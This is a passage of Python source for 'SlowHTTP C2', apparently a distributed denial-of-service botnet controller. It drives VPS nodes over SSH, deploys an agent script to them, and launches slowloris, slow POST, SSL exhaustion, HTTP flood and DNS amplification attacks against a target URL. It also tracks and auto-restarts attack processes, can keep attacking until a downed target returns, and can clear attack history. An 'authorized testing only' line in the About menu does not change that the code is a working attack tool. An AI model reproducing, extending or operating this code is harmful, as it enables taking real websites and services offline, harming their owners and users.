                print(f"\n{Colors.RED}Error: {results['error']}{Colors.RESET}")
                input("\nPress Enter to continue...")
                return
            
            print(f"\nRegistrar: {results['registrar'] or 'N/A'}")
            print(f"Creation Date: {results['creation_date'] or 'N/A'}")
            print(f"Expiration Date: {results['expiration_date'] or 'N/A'}")
            
            if results['name_servers']:
                print("\nName Servers:")
                for ns in results['name_servers']:
                    print(f"  {ns}")
            
            if results['status']:
                print("\nDomain Status:")
                for status in results['status']:
                    print(f"  {status}")
            
            # Ask if user wants to see raw data
            if self.terminal.confirm_action("\nView raw WHOIS data?"):
                print(f"\n{Colors.CYAN}Raw WHOIS Data:{Colors.RESET}")
                print("-" * 50)
                print(results['raw_data'])
                print("-" * 50)
            
            input("\nPress Enter to continue...")
            
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}Operation cancelled.{Colors.RESET}")
            time.sleep(1)
    
    def system_status_menu(self):
        """System status menu"""
        self.terminal.clear_screen()
        self.terminal.print_header("SYSTEM STATUS")
        
        # Get VPS status
        vps_list = self.db_manager.get_all_vps()
        online_count = sum(1 for vps in vps_list if vps['status'] == 'online')
        offline_count = sum(1 for vps in vps_list if vps['status'] == 'offline')
        
        # Get attack status
        running_attacks = self.db_manager.get_all_attack_sessions(status='running')
        completed_attacks = self.db_manager.get_all_attack_sessions(status='completed')
        failed_attacks = self.db_manager.get_all_attack_sessions(status='failed')
        
        print(f"\n{Colors.BOLD}VPS Status:{Colors.RESET}")
        print(f"Total VPS: {len(vps_list)}")
        print(f"Online: {Colors.GREEN}{online_count}{Colors.RESET}")
        print(f"Offline: {Colors.RED}{offline_count}{Colors.RESET}")
        
        print(f"\n{Colors.BOLD}Attack Status:{Colors.RESET}")
        print(f"Running Attacks: {Colors.GREEN}{len(running_attacks)}{Colors.RESET}")
        print(f"Completed Attacks: {Colors.BLUE}{len(completed_attacks)}{Colors.RESET}")
        print(f"Failed Attacks: {Colors.RED}{len(failed_attacks)}{Colors.RESET}")
        
        # Get system status
        if PSUTIL_AVAILABLE:
            print(f"\n{Colors.BOLD}System Resources:{Colors.RESET}")
            
            # CPU usage
            cpu_percent = psutil.cpu_percent(interval=1)
            print(f"CPU Usage: {cpu_percent}%")
            
            # Memory usage
            memory = psutil.virtual_memory()
            print(f"Memory Usage: {memory.percent}% ({self._format_bytes(memory.used)} / {self._format_bytes(memory.total)})")
            
            # Disk usage
            disk = psutil.disk_usage('/')
            print(f"Disk Usage: {disk.percent}% ({self._format_bytes(disk.used)} / {self._format_bytes(disk.total)})")
            
            # Network stats
            net_io = psutil.net_io_counters()
            print(f"Network: Sent {self._format_bytes(net_io.bytes_sent)} | Received {self._format_bytes(net_io.bytes_recv)}")
        
        print("\nOptions:")
        print("1. Refresh Status")
        print("2. Check VPS Connections")
        print("3. View Running Attacks")
        print("0. Back")
        
        try:
            choice = int(input("\nEnter your choice: "))
            
            if choice == 1:
                self.system_status_menu()  # Refresh
            elif choice == 2:
                self.check_vps_connections()
            elif choice == 3:
                self.monitor_attacks_menu()
            
        except ValueError:
            pass
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}Operation cancelled.{Colors.RESET}")
            time.sleep(1)
    
    def check_vps_connections(self):
        """Check VPS connections"""
        self.terminal.clear_screen()
        self.terminal.print_header("VPS CONNECTIONS")
        
        vps_list = self.db_manager.get_all_vps()
        
        if not vps_list:
            print(f"\n{Colors.YELLOW}No VPS nodes found.{Colors.RESET}")
            input("\nPress Enter to continue...")
            return
        
        print(f"\n{Colors.CYAN}Checking VPS connections...{Colors.RESET}")
        
        headers = ["ID", "Name", "IP Address", "Status"]
        data = []
        
        for vps in vps_list:
            # Check connection status
            is_connected = self.ssh_manager.get_connection_status(vps['ip_address'])
            
            status_str = "online" if is_connected else "offline"
            if status_str == 'online':
                status_str = f"{Colors.GREEN}{status_str}{Colors.RESET}"
            else:
                status_str = f"{Colors.RED}{status_str}{Colors.RESET}"
            
            data.append([
                vps['id'],
                vps['name'],
                vps['ip_address'],
                status_str
            ])
            
            # Update status in database
            self.db_manager.update_vps_status(vps['ip_address'], "online" if is_connected else "offline")
        
        self.terminal.print_table(headers, data)
        
        print("\nOptions:")
        print("1. Reconnect All Offline VPS")
        print("0. Back")
        
        try:
            choice = int(input("\nEnter your choice: "))
            
            if choice == 1:
                self.reconnect_offline_vps()
            
        except ValueError:
            pass
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}Operation cancelled.{Colors.RESET}")
            time.sleep(1)
    
    def reconnect_offline_vps(self):
        """Reconnect all offline VPS"""
        self.terminal.clear_screen()
        self.terminal.print_header("RECONNECT OFFLINE VPS")
        
        vps_list = self.db_manager.get_all_vps()
        offline_vps = [vps for vps in vps_list if vps['status'] == 'offline']
        
        if not offline_vps:
            print(f"\n{Colors.YELLOW}No offline VPS nodes found.{Colors.RESET}")
            input("\nPress Enter to continue...")
            return
        
        print(f"\n{Colors.CYAN}Attempting to reconnect {len(offline_vps)} offline VPS nodes...{Colors.RESET}")
        
        success_count = 0
        
        for vps in offline_vps:
            print(f"\n{Colors.CYAN}Connecting to {vps['name']} ({vps['ip_address']})...{Colors.RESET}", end="", flush=True)
            
            success, message = self.ssh_manager.connect_vps(
                vps['ip_address'],
                vps['username'],
                vps['password'],
                vps['ssh_port']
            )
            
            if success:
                print(f" {Colors.GREEN}SUCCESS{Colors.RESET}")
                self.db_manager.update_vps_status(vps['ip_address'], 'online')
                success_count += 1
            else:
                print(f" {Colors.RED}FAILED{Colors.RESET}")
                print(f"  Error: {message}")
        
        print(f"\n{Colors.GREEN}Successfully reconnected {success_count}/{len(offline_vps)} VPS nodes.{Colors.RESET}")
        input("\nPress Enter to continue...")
    
    def settings_menu(self):
        """Settings menu"""
        while True:
            self.terminal.clear_screen()
            self.terminal.print_header("SETTINGS")
            
            options = [
                "General Settings",
                "Security Settings",
                "Network Settings",
                "Database Settings",
                "About"
            ]
            
            choice = self.terminal.input_menu("SETTINGS", options)
            
            if choice == 1:
                self.general_settings()
            elif choice == 2:
                self.security_settings()
            elif choice == 3:
                self.network_settings()
            elif choice == 4:
                self.database_settings()
            elif choice == 5:
                self.about_menu()
            elif choice == 0:
                break
    
    def general_settings(self):
        """General settings"""
        self.terminal.clear_screen()
        self.terminal.print_header("GENERAL SETTINGS")
        
        # Get current settings
        refresh_interval = self.db_manager.get_setting('refresh_interval', '2')
        auto_reconnect = self.db_manager.get_setting('auto_reconnect', 'true')
        
        print(f"\nCurrent Settings:")
        print(f"1. Refresh Interval: {refresh_interval} seconds")
        print(f"2. Auto Reconnect: {auto_reconnect}")
        print("0. Back")
        
        try:
            choice = int(input("\nEnter setting to change (0 to cancel): "))
            
            if choice == 1:
                new_value = self.terminal.input_with_validation(
                    "Enter new refresh interval (seconds)",
                    lambda x: x.isdigit() and int(x) > 0,
                    "Must be a positive number",
                    default=refresh_interval
                )
                self.db_manager.set_setting('refresh_interval', new_value)
                print(f"\n{Colors.GREEN}Refresh interval updated.{Colors.RESET}")
                
            elif choice == 2:
                new_value = 'true' if self.terminal.confirm_action("Enable auto reconnect?", default=auto_reconnect == 'true') else 'false'
                self.db_manager.set_setting('auto_reconnect', new_value)
                print(f"\n{Colors.GREEN}Auto reconnect setting updated.{Colors.RESET}")
            
            input("\nPress Enter to continue...")
            
        except ValueError:
            pass
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}Operation cancelled.{Colors.RESET}")
            time.sleep(1)
    
    def security_settings(self):
        """Security settings"""
        self.terminal.clear_screen()
        self.terminal.print_header("SECURITY SETTINGS")
        
        # Get current settings
        encrypt_passwords = self.db_manager.get_setting('encrypt_passwords', 'true')
        
        print(f"\nCurrent Settings:")
        print(f"1. Encrypt Passwords: {encrypt_passwords}")
        print("2. Regenerate Encryption Key")
        print("0. Back")
        
        try:
            choice = int(input("\nEnter setting to change (0 to cancel): "))
            
            if choice == 1:
                new_value = 'true' if self.terminal.confirm_action("Enable password encryption?", default=encrypt_passwords == 'true') else 'false'
                self.db_manager.set_setting('encrypt_passwords', new_value)
                print(f"\n{Colors.GREEN}Password encryption setting updated.{Colors.RESET}")
                
            elif choice == 2:
                if self.terminal.confirm_action("Are you sure you want to regenerate the encryption key? This will require re-encrypting all passwords.", default=False):
                    # Regenerate key
                    if CRYPTO_AVAILABLE:
                        # Get all VPS to re-encrypt passwords
                        vps_list = self.db_manager.get_all_vps()
                        
                        # Generate new key
                        self.db_manager.security.key = Fernet.generate_key()
                        self.db_manager.security.fernet = Fernet(self.db_manager.security.key)
                        
                        # Save new key
                        key_file = "config/encryption.key"
                        os.makedirs(os.path.dirname(key_file), exist_ok=True)
                        
                        try:
                            with open(key_file, "wb") as f:
                                f.write(self.db_manager.security.key)
                            os.chmod(key_file, 0o600)  # Secure permissions
                            
                            # Re-encrypt all passwords
                            for vps in vps_list:
                                # Get decrypted password
                                password = vps['password']
                                
                                # Re-encrypt with new key
                                encrypted_password = self.db_manager.security.encrypt_password(password)
                                
                                # Update in database
                                self.db_manager.update_vps(vps['id'], password=password)
                            
                            print(f"\n{Colors.GREEN}Encryption key regenerated and passwords re-encrypted.{Colors.RESET}")
                        except Exception as e:
                            print(f"\n{Colors.RED}Error regenerating encryption key: {str(e)}{Colors.RESET}")
                    else:
                        print(f"\n{Colors.RED}Cryptography module not available. Cannot regenerate key.{Colors.RESET}")
            
            input("\nPress Enter to continue...")
            
        except ValueError:
            pass
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}Operation cancelled.{Colors.RESET}")
            time.sleep(1)
    
    def network_settings(self):
        """Network settings"""
        self.terminal.clear_screen()
        self.terminal.print_header("NETWORK SETTINGS")
        
        # Get current settings
        connection_timeout = self.db_manager.get_setting('connection_timeout', '10')
        command_timeout = self.db_manager.get_setting('command_timeout', '30')
        
        print(f"\nCurrent Settings:")
        print(f"1. Connection Timeout: {connection_timeout} seconds")
        print(f"2. Command Timeout: {command_timeout} seconds")
        print("0. Back")
        
        try:
            choice = int(input("\nEnter setting to change (0 to cancel): "))
            
            if choice == 1:
                new_value = self.terminal.input_with_validation(
                    "Enter new connection timeout (seconds)",
                    lambda x: x.isdigit() and int(x) > 0,
                    "Must be a positive number",
                    default=connection_timeout
                )
                self.db_manager.set_setting('connection_timeout', new_value)
                self.ssh_manager.connection_timeout = int(new_value)
                print(f"\n{Colors.GREEN}Connection timeout updated.{Colors.RESET}")
                
            elif choice == 2:
                new_value = self.terminal.input_with_validation(
                    "Enter new command timeout (seconds)",
                    lambda x: x.isdigit() and int(x) > 0,
                    "Must be a positive number",
                    default=command_timeout
                )
                self.db_manager.set_setting('command_timeout', new_value)
                self.ssh_manager.command_timeout = int(new_value)
                print(f"\n{Colors.GREEN}Command timeout updated.{Colors.RESET}")
            
            input("\nPress Enter to continue...")
            
        except ValueError:
            pass
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}Operation cancelled.{Colors.RESET}")
            time.sleep(1)
    
    def database_settings(self):
        """Database settings"""
        self.terminal.clear_screen()
        self.terminal.print_header("DATABASE SETTINGS")
        
        # Get database info
        db_file = self.db_manager.db_file
        
        try:
            db_size = os.path.getsize(db_file)
            db_size_str = self._format_bytes(db_size)
            db_modified = datetime.fromtimestamp(os.path.getmtime(db_file)).strftime('%Y-%m-%d %H:%M:%S')
        except:
            db_size_str = "Unknown"
            db_modified = "Unknown"
        
        print(f"\nDatabase Information:")
        print(f"File: {db_file}")
        print(f"Size: {db_size_str}")
        print(f"Last Modified: {db_modified}")
        
        print("\nOptions:")
        print("1. Backup Database")
        print("2. Optimize Database")
        print("3. Clear Attack History")
        print("0. Back")
        
        try:
            choice = int(input("\nEnter your choice: "))
            
            if choice == 1:
                self.backup_database()
            elif choice == 2:
                self.optimize_database()
            elif choice == 3:
                self.clear_attack_history()
            
        except ValueError:
            pass
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}Operation cancelled.{Colors.RESET}")
            time.sleep(1)
    
    def backup_database(self):
        """Backup database"""
        self.terminal.clear_screen()
        self.terminal.print_header("BACKUP DATABASE")
        
        # Create backup directory
        backup_dir = "backups"
        os.makedirs(backup_dir, exist_ok=True)
        
        # Generate backup filename
        backup_file = f"{backup_dir}/slowhttp_c2_backup_{datetime.now().strftime('%Y%m%d_%H%M%S')}.db"
        
        try:
            # Close database connection
            self.db_manager.close()
            
            # Copy database file
            shutil.copy2(self.db_manager.db_file, backup_file)
            
            print(f"\n{Colors.GREEN}Database backed up successfully to {backup_file}{Colors.RESET}")
            
            # Reconnect to database
            self.db_manager._get_connection()
            
        except Exception as e:
            print(f"\n{Colors.RED}Error backing up database: {str(e)}{Colors.RESET}")
            
            # Ensure database connection is restored
            self.db_manager._get_connection()
        
        input("\nPress Enter to continue...")
    
    def optimize_database(self):
        """Optimize database"""
        self.terminal.clear_screen()
        self.terminal.print_header("OPTIMIZE DATABASE")
        
        print(f"\n{Colors.CYAN}Optimizing database...{Colors.RESET}")
        
        try:
            # Run VACUUM
            self.db_manager.execute_query("VACUUM")
            
            # Run ANALYZE
            self.db_manager.execute_query("ANALYZE")
            
            print(f"\n{Colors.GREEN}Database optimized successfully.{Colors.RESET}")
            
        except Exception as e:
            print(f"\n{Colors.RED}Error optimizing database: {str(e)}{Colors.RESET}")
        
        input("\nPress Enter to continue...")
    
    def clear_attack_history(self):
        """Clear attack history"""
        self.terminal.clear_screen()
        self.terminal.print_header("CLEAR ATTACK HISTORY")
        
        # Get attack count
        attack_count = len(self.db_manager.get_all_attack_sessions())
        
        print(f"\nThis will delete ALL attack history ({attack_count} attacks) and results.")
        print(f"{Colors.RED}WARNING: This action cannot be undone!{Colors.RESET}")
        
        if not self.terminal.confirm_action("Are you sure you want to clear all attack history?", default=False):
            print(f"\n{Colors.YELLOW}Operation cancelled.{Colors.RESET}")
            input("\nPress Enter to continue...")
            return
        
        try:
            # Delete attack results
            self.db_manager.execute_query("DELETE FROM attack_results")
            
            # Delete attack sessions
            self.db_manager.execute_query("DELETE FROM attack_sessions")
            
            print(f"\n{Colors.GREEN}Attack history cleared successfully.{Colors.RESET}")
            
        except Exception as e:
            print(f"\n{Colors.RED}Error clearing attack history: {str(e)}{Colors.RESET}")
        
        input("\nPress Enter to continue...")
    
    def about_menu(self):
        """About menu"""
        self.terminal.clear_screen()
        self.terminal.print_header("ABOUT")
        
        print(f"\n{Colors.BOLD}SlowHTTP C2 - Advanced Distributed Testing Tool v{VERSION}{Colors.RESET}")
        print("For educational and authorized testing purposes only.")
        
        print("\nAvailable Modules:")
        
        modules = [
            ("Cryptography", CRYPTO_AVAILABLE),
            ("SSH (Paramiko)", SSH_AVAILABLE),
            ("Color Support", COLOR_AVAILABLE),
            ("System Monitoring", PSUTIL_AVAILABLE),
            ("Network Requests", REQUESTS_AVAILABLE),
            ("DNS Tools", DNS_AVAILABLE)
        ]
        
        for module, available in modules:
            status = f"{Colors.GREEN}Available{Colors.RESET}" if available else f"{Colors.RED}Not Available{Colors.RESET}"
            print(f"- {module}: {status}")
        
        print("\nSystem Information:")
        print(f"Python Version: {platform.python_version()}")
        print(f"Platform: {platform.platform()}")
        
        input("\nPress Enter to continue...")

class AttackManager:
    """Enhanced attack manager with improved monitoring and error handling"""
    
    def __init__(self, db_manager, ssh_manager):
        """Initialize attack manager"""
        self.db_manager = db_manager
        self.ssh_manager = ssh_manager
        self.active_attacks = {}  # Track active attacks
        self.monitoring_threads = {}  # Track monitoring threads
        self.lock = threading.RLock()  # Thread-safe operations
        
        # Create a thread pool for parallel operations
        self.thread_pool = ThreadPoolExecutor(max_workers=10)
        
        # Set up agent directory on all VPS
        self._setup_agent_directories()
    
    def _setup_agent_directories(self):
        """Set up agent directories on all VPS nodes"""
        vps_list = self.db_manager.get_all_vps()
        
        for vps in vps_list:
            if vps['status'] == 'online':
                # Check if agent directory exists
                cmd = "if [ -d ~/slowhttp_agent ]; then echo 'exists'; else echo 'not_exists'; fi"
                success, output = self.ssh_manager.execute_command(vps['ip_address'], cmd)
                
                if success and output.strip() == 'not_exists':
                    # Create directory
                    cmd = "mkdir -p ~/slowhttp_agent"
                    self.ssh_manager.execute_command(vps['ip_address'], cmd)
                    
                    # Deploy agent script
                    self._deploy_agent_script(vps['ip_address'])
    
    def _deploy_agent_script(self, ip_address):
        """Deploy agent script to a VPS"""
        logger.info(f"Deploying agent script to {ip_address}")
        
        try:
            # Check if VPS supports advanced features
            cmd = "python3 -c 'import ssl, struct, select' 2>/dev/null && echo 'advanced' || echo 'standard'"
            success, output = self.ssh_manager.execute_command(ip_address, cmd)
            
            if success and output.strip() == 'advanced':
                agent_script = self._get_advanced_agent_script()
            else:
                agent_script = self._get_standard_agent_script()
            
            # Write script to VPS
            write_cmd = f"cat > ~/slowhttp_agent/agent.py << 'EOL'\n{agent_script}\nEOL"
            success, _ = self.ssh_manager.execute_command(ip_address, write_cmd)
            
            if not success:
                logger.error(f"Failed to write agent script to {ip_address}")
                return False
            
            # Make script executable
            chmod_cmd = "chmod +x ~/slowhttp_agent/agent.py"
            success, _ = self.ssh_manager.execute_command(ip_address, chmod_cmd)
            
            if not success:
                logger.error(f"Failed to make agent script executable on {ip_address}")
                return False
            
            # Test script
            test_cmd = "cd ~/slowhttp_agent && python3 agent.py --version"
            success, output = self.ssh_manager.execute_command(ip_address, test_cmd)
            
            if not success:
                logger.error(f"Agent script test failed on {ip_address}: {output}")
                return False
            
            logger.info(f"Agent script deployed successfully to {ip_address}")
            return True
            
        except Exception as e:
            logger.error(f"Error deploying agent script to {ip_address}: {str(e)}")
            return False
    
    def launch_attack(self, session_id, target_url, attack_type, vps_list, parameters):
        """Launch attack with comprehensive error handling and auto-reconnect"""
        
        # Parse target URL properly
        if target_url.startswith('http'):
            parsed = urlparse(target_url)
            target_host = parsed.hostname or parsed.netloc
            use_ssl = target_url.startswith('https://')
        else:
            target_host = target_url.split(':')[0].split('/')[0]
            use_ssl = False
        
        self.active_attacks[session_id] = {
            'target_host': target_host,
            'target_url': target_url,
            'attack_type': attack_type,
            'vps_list': vps_list,
            'status': 'running',
            'start_time': datetime.now(),
            'parameters': parameters,
            'use_ssl': use_ssl,
            'process_ids': {}  # Store process IDs for each VPS
        }
        
        logger.info(f"Launching {attack_type} attack on {target_host}")
        print(f"\n{Colors.YELLOW}[ATTACK] Launching {attack_type} attack on {target_host}{Colors.RESET}")
        print(f"{Colors.CYAN}[CONFIG] VPS nodes: {len(vps_list)} | Connections per VPS: {parameters.get('connections', 100)}{Colors.RESET}")
        
        success_count = 0
        failed_vps = []
        
        # Get all VPS data from database for reconnection
        all_vps_data = {vps['ip_address']: vps for vps in self.db_manager.get_all_vps()}
        
        for vps_ip in vps_list:
            print(f"{Colors.CYAN}[LAUNCHING] {vps_ip}...{Colors.RESET} ", end="", flush=True)
            
            # Check connection status and reconnect if necessary
            if not self.ssh_manager.get_connection_status(vps_ip):
                print(f"{Colors.YELLOW}RECONNECTING...{Colors.RESET} ", end="", flush=True)
                
                vps_data = all_vps_data.get(vps_ip)
                if vps_data:
                    reconnect_success, reconnect_msg = self.ssh_manager.connect_vps(
                        vps_data['ip_address'], vps_data['username'], vps_data['password'], vps_data['ssh_port']
                    )
                    if reconnect_success:
                        print(f"{Colors.GREEN}CONNECTED{Colors.RESET} ", end="", flush=True)
                        self.db_manager.update_vps_status(vps_ip, 'online')
                    else:
                        print(f"{Colors.RED}CONN_FAILED{Colors.RESET}")
                        failed_vps.append(f"{vps_ip}: Reconnection failed - {reconnect_msg}")
                        continue
                else:
                    print(f"{Colors.RED}NO_DATA{Colors.RESET}")
                    failed_vps.append(f"{vps_ip}: VPS data not found in database")
                    continue
            
            # Check if agent script exists and deploy if needed
            cmd = "if [ -f ~/slowhttp_agent/agent.py ]; then echo 'exists'; else echo 'not_exists'; fi"
            success, output = self.ssh_manager.execute_command(vps_ip, cmd)
            
            if not success or output.strip() == 'not_exists':
                print(f"{Colors.YELLOW}DEPLOYING AGENT...{Colors.RESET} ", end="", flush=True)
                if not self._deploy_agent_script(vps_ip):
                    print(f"{Colors.RED}DEPLOY_FAILED{Colors.RESET}")
                    failed_vps.append(f"{vps_ip}: Failed to deploy agent script")
                    continue
            
            # Build attack command
            cmd = self._build_attack_command(target_url, attack_type, parameters)
            
            # Execute with longer timeout and better error detection
            success, output = self.ssh_manager.execute_command(vps_ip, cmd, timeout=30)
            
            if success and output.strip().isdigit():
                # Store process ID for monitoring
                process_id = output.strip()
                self.active_attacks[session_id]['process_ids'][vps_ip] = process_id
                print(f"{Colors.GREEN}LAUNCHED (PID: {process_id}){Colors.RESET}")
                success_count += 1
                
                # Start monitoring thread for this VPS
                self._start_monitoring_thread(session_id, vps_ip)
            else:
                print(f"{Colors.RED}FAILED{Colors.RESET}")
                failed_vps.append(f"{vps_ip}: {output}")
        
        # Update attack status in database
        if success_count > 0:
            self.db_manager.update_attack_status(session_id, 'running')
            
            # Start a thread to monitor the attack duration
            duration = parameters.get('duration', 300)  # Default 5 minutes
            threading.Thread(target=self._monitor_attack_duration, args=(session_id, duration), daemon=True).start()
            
            print(f"\n{Colors.GREEN}[SUCCESS] Attack launched on {success_count}/{len(vps_list)} VPS nodes{Colors.RESET}")
            
            if failed_vps:
                print(f"\n{Colors.YELLOW}[WARNING] Failed to launch on {len(failed_vps)} VPS nodes:{Colors.RESET}")
                for failure in failed_vps:
                    print(f"  - {failure}")
            
            return True
        else:
            self.db_manager.update_attack_status(session_id, 'failed', json.dumps({"errors": failed_vps}))
            print(f"\n{Colors.RED}[ERROR] Failed to launch attack on any VPS nodes{Colors.RESET}")
            return False
    
    def _build_attack_command(self, target_url, attack_type, parameters):
        """Build the attack command to execute on VPS with improved error handling"""
        
        # Base command with nohup to keep running after SSH disconnects
        # Redirect stderr to stdout, and use 'tee' to capture output to log file
        # Return the process ID at the end
        cmd = "cd ~/slowhttp_agent && nohup python3 agent.py "
        
        # Add target
        cmd += f"--target &quot;{target_url}&quot; "
        
        # Add attack type
        cmd += f"--attack-type {attack_type} "
        
        # Add common parameters
        connections = parameters.get('connections', 100)
        cmd += f"--connections {connections} "
        
        duration = parameters.get('duration', 300)
        cmd += f"--duration {duration} "
        
        # Add attack-specific parameters
        if attack_type in ['slowloris', 'slow_post', 'slow_read', 'ssl_exhaust']:
            delay = parameters.get('delay', 10)
            cmd += f"--delay {delay} "
        
        if attack_type == 'http_flood':
            requests = parameters.get('requests', 1000)
            cmd += f"--requests {requests} "
        
        if attack_type == 'dns_amplification':
            target_ip = parameters.get('target_ip')
            if target_ip:
                cmd += f"--target-ip {target_ip} "
        
        # Create a unique log file name
        log_file = f"attack_{attack_type}_{int(time.time())}.log"
        
        # Redirect output to log file and run in background
        # Use 'tee' to capture output and still return the process ID
        cmd += f"> {log_file} 2>&1 & echo $!"
        
        return cmd
    
    def _start_monitoring_thread(self, session_id, vps_ip):
        """Start a thread to monitor attack progress on a VPS"""
        if session_id not in self.monitoring_threads:
            self.monitoring_threads[session_id] = {}
        
        # Create and start monitoring thread
        thread = threading.Thread(
            target=self._monitor_attack_vps,
            args=(session_id, vps_ip),
            daemon=True
        )
        thread.start()
        
        self.monitoring_threads[session_id][vps_ip] = thread
    
    def _monitor_attack_vps(self, session_id, vps_ip):
        """Monitor attack progress on a specific VPS with improved error handling"""
        attack_info = self.active_attacks.get(session_id)
        if not attack_info:
            return
        
        # Get monitoring interval based on attack type
        if attack_info['attack_type'] in ['slowloris', 'slow_post', 'slow_read']:
            interval = 10  # Slower attacks need less frequent monitoring
        else:
            interval = 5   # Faster attacks need more frequent monitoring
        
        # Get process ID
        process_id = attack_info['process_ids'].get(vps_ip)
        
        # Track consecutive failures
        consecutive_failures = 0
        max_consecutive_failures = 3
        
        while session_id in self.active_attacks and self.active_attacks[session_id]['status'] == 'running':
            try:
                # Check if process is still running using the stored PID
                if process_id:
                    cmd = f"ps -p {process_id} -o pid= || echo 'not_running'"
                    success, output = self.ssh_manager.execute_command(vps_ip, cmd, timeout=10)
                    
                    if not success or 'not_running' in output:
                        # Process not found by PID, check if any agent.py is running
                        cmd = "pgrep -f 'python3 agent.py' || echo 'not_running'"
                        success, output = self.ssh_manager.execute_command(vps_ip, cmd, timeout=10)
                        
                        if not success or 'not_running' in output:
                            # Process not found, attack might have stopped
                            logger.warning(f"Attack process not found on {vps_ip}")
                            consecutive_failures += 1
                            
                            # Add result with error
                            self.db_manager.add_attack_result(
                                session_id, vps_ip, 0, 0, 0, 1, None, None, None, 'error'
                            )
                            
                            # Try to restart the attack if we've had multiple consecutive failures
                            if consecutive_failures >= max_consecutive_failures:
                                logger.warning(f"Multiple consecutive failures on {vps_ip}, attempting restart")
                                new_pid = self._attempt_restart_attack(session_id, vps_ip)
                                if new_pid:
                                    process_id = new_pid
                                    consecutive_failures = 0
                                    logger.info(f"Successfully restarted attack on {vps_ip} with PID {process_id}")
                            
                            # Sleep before next check
                            time.sleep(interval)
                            continue
                
                # Process is running, reset consecutive failures
                consecutive_failures = 0
                
                # Get CPU and memory usage
                cmd = f"ps -p {process_id} -o %cpu,%mem | tail -1 || echo '0 0'"
                success, resource_output = self.ssh_manager.execute_command(vps_ip, cmd, timeout=10)
                
                cpu_usage = None
                memory_usage = None
                
                if success and resource_output:
                    parts = resource_output.strip().split()
                    if len(parts) >= 2:
                        try:
                            cpu_usage = float(parts[0])
                            memory_usage = float(parts[1])
                        except ValueError:
                            pass
                
                # Try to get attack stats from log file
                cmd = "cd ~/slowhttp_agent && cat attack_*.log | grep -a 'Status:' | tail -1"
                success, stats_output = self.ssh_manager.execute_command(vps_ip, cmd, timeout=10)
                
                connections_active = 0
                packets_sent = 0
                bytes_sent = 0
                error_count = 0
                response_codes = {}
                
                if success and stats_output:
                    # Parse stats from output
                    # Example: "[*] Status: 150 connections active, 1500 packets sent"
                    try:
                        # Extract connections
                        conn_match = re.search(r'(\d+) connections active', stats_output)
                        if conn_match:
                            connections_active = int(conn_match.group(1))
                        
                        # Extract packets
                        packets_match = re.search(r'(\d+) packets sent', stats_output)
                        if packets_match:
                            packets_sent = int(packets_match.group(1))
                        
                        # Extract bytes (if available)
                        bytes_match = re.search(r'(\d+) bytes sent', stats_output)
                        if bytes_match:
                            bytes_sent = int(bytes_match.group(1))
                        
                        # Extract errors (if available)
                        error_match = re.search(r'(\d+) errors', stats_output)
                        if error_match:
                            error_count = int(error_match.group(1))
                        
                        # Extract response codes (if available)
                        codes_match = re.search(r'Response codes: (.*)', stats_output)
                        if codes_match:
                            codes_str = codes_match.group(1)
                            code_parts = codes_str.split(', ')
                            for part in code_parts:
                                if ': ' in part:
                                    code, count = part.split(': ')
                                    response_codes[code] = int(count)
                    except Exception as e:
                        logger.error(f"Error parsing stats from {vps_ip}: {str(e)}")
                
                # Add result to database
                self.db_manager.add_attack_result(
                    session_id, vps_ip, connections_active, packets_sent, bytes_sent,
                    error_count, cpu_usage, memory_usage, json.dumps(response_codes), 'running'
                )
                
            except Exception as e:
                logger.error(f"Error monitoring attack on {vps_ip}: {str(e)}")
                logger.error(traceback.format_exc())
                consecutive_failures += 1
            
            # Sleep before next check
            time.sleep(interval)
    
    def _attempt_restart_attack(self, session_id, vps_ip):
        """Attempt to restart a failed attack on a VPS with improved error handling"""
        attack_info = self.active_attacks.get(session_id)
        if not attack_info:
            return False
        
        logger.info(f"Attempting to restart attack on {vps_ip}")
        
        try:
            # Kill any existing agent processes
            kill_cmd = "pkill -f 'python3 agent.py' || true"
            self.ssh_manager.execute_command(vps_ip, kill_cmd, timeout=10)
            
            # Wait a moment for processes to terminate
            time.sleep(1)
            
            # Build attack command
            cmd = self._build_attack_command(
                attack_info['target_url'],
                attack_info['attack_type'],
                attack_info['parameters']
            )
            
            # Execute with longer timeout
            success, output = self.ssh_manager.execute_command(vps_ip, cmd, timeout=30)
            
            if success and output.strip().isdigit():
                # Update process ID
                process_id = output.strip()
                self.active_attacks[session_id]['process_ids'][vps_ip] = process_id
                logger.info(f"Successfully restarted attack on {vps_ip} with PID {process_id}")
                return process_id
            else:
                logger.error(f"Failed to restart attack on {vps_ip}: {output}")
                return None
        except Exception as e:
            logger.error(f"Error restarting attack on {vps_ip}: {str(e)}")
            logger.error(traceback.format_exc())
            return None
    
    def _monitor_attack_duration(self, session_id, duration):
        """Monitor attack duration and stop when time is up"""
        attack_info = self.active_attacks.get(session_id)
        if not attack_info:
            return
            
        # Check if this is an unlimited attack
        is_unlimited = attack_info.get('parameters', {}).get('unlimited', False)
        auto_restart = attack_info.get('parameters', {}).get('auto_restart', False)
        
        if is_unlimited:
            logger.info(f"Monitoring unlimited attack {session_id}")
            
            if auto_restart:
                # Start target availability monitoring thread
                check_interval = attack_info.get('parameters', {}).get('check_interval', 60)
                threading.Thread(
                    target=self._monitor_target_availability,
                    args=(session_id, check_interval),
                    daemon=True
                ).start()
                
            # For unlimited attacks, we don't stop automatically
            return
        else:
            logger.info(f"Monitoring attack {session_id} for {duration} seconds")
            
            # Sleep for the duration
            time.sleep(duration)
            
            # Check if attack is still active
            if session_id in self.active_attacks and self.active_attacks[session_id]['status'] == 'running':
                logger.info(f"Attack {session_id} duration reached, stopping")
                self.stop_attack(session_id)
    
    def _monitor_target_availability(self, session_id, check_interval):
        """Monitor target availability and restart attack if needed"""
        attack_info = self.active_attacks.get(session_id)
        if not attack_info:
            return
            
        target_url = attack_info.get('target_url')
        if not target_url:
            return
            
        logger.info(f"Starting target availability monitoring for {target_url}")
        
        # Track target status
        target_available = True
        target_unavailable_since = None
        
        while session_id in self.active_attacks and self.active_attacks[session_id]['status'] == 'running':
            try:
                # Check if target is available
                available = self._check_target_availability(target_url)
                
                if available and not target_available:
                    # Target was down but is now up - restart attack
                    downtime = time.time() - target_unavailable_since if target_unavailable_since else 0
